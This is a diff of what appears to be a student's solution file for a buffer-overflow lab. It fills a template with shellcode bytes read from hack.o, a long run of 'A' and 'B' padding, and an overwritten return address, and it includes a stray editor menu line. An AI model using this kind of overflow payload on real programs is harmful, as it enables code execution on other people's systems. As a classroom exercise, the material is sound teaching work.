@@ -1,13 +1,20 @@
-# First, the section letter and _ to make things even
-S B_
-# 
-# After this, specify what you want written to the solution.txt file 
-# to fill in the buffer
-#
-# You may specify (with the leading "# " which makes it into a comment)...
-# # A comment line which will be ignored
-# S A string to be written to the file (up to the newline)
-# X dead beef # One or more pairs of hex digits to be translated to binary and written
-# A beefdeaddeadbeef # Sixteen hex digits to be translated to binary, and written little endian 
-# R file_name S L # A file to be read from byte S for L bytes into solution.txt 
-#     for example: "R hack.o 64 28" to read 28 bytes from the hack.o file starting at byte 64 
+File Edit Options Buffers Tools Text Help
+S C_
+R hack.o 64 18
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 41 41 41 41 41 41 41 41 41 41 41 41 41
+X 42 42 42 42 42 42 42 42
+A 0x55555555f002
